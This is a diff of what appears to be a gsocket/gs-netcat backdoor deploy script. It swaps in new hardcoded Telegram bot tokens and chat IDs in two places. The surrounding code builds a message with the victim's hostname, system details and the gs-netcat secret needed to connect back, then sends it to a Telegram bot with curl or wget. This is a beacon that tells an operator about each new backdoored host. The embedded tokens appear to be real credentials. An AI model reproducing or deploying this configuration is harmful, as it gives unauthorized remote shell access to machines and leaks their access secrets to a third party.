@@ -47,9 +47,9 @@
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
 GS_TG_TOKEN=
-      - Telegram Bot ID, =8757338168:AAF5iZd15_7rL31vKmCRI-2Zl76TUwIQC6w
+      - Telegram Bot ID, ="8757338168:AAEAAPvd1CmDzjBFPNJ5WsVriPwIePuClvw"
 GS_TG_CHATID=
-      - Telegram Chat ID, =-4670927725
+      - Telegram Chat ID, ="1603160876"
 # GS_DISCORD_KEY=
 #       - Discord API key, =""
 # GS_WEBHOOK_KEY=
@@ -89,8 +89,8 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
-GS_TG_TOKEN=8757338168:AAF5iZd15_7rL31vKmCRI-2Zl76TUwIQC6w
-GS_TG_CHATID=-4670927725
+GS_TG_TOKEN="8757338168:AAEAAPvd1CmDzjBFPNJ5WsVriPwIePuClvw"
+GS_TG_CHATID="1603160876"
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
